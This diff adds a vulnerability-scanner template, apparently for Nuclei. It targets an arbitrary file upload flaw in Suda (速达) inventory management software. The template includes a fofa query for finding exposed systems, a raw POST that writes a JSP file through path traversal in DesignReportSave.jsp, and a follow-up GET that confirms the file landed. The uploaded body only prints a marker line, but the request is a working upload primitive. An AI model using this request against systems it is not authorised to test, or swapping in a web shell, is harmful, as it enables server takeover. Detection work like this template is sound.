@@ -1,0 +1,46 @@
+id: security_products_rce
+info:
+  name: 速达进存销管理系统任意文件上传漏洞
+  author: rain
+  severity: high
+  description: 速达进存销管理系统任意文件上传漏洞
+  tags:
+    - rce
+  metadata:
+    fofa-query: app="速达软件-公司产品"
+http:
+  - raw:
+      - |
+        POST /report/DesignReportSave.jsp?report=../securityCheck.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+        Accept-Encoding: gzip, deflate
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Connection: close 
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/octet-stream
+        Content-Length: 54
+
+        <% out.print("This website has a vulnerability!!!");%>
+      - |
+        GET /securityCheck.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+        Accept-Encoding: gzip, deflate
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Connection: close 
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/octet-stream
+        Content-Length: 54
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1==200
+
+      - type: dsl
+        dsl:
+          - status_code_2==200
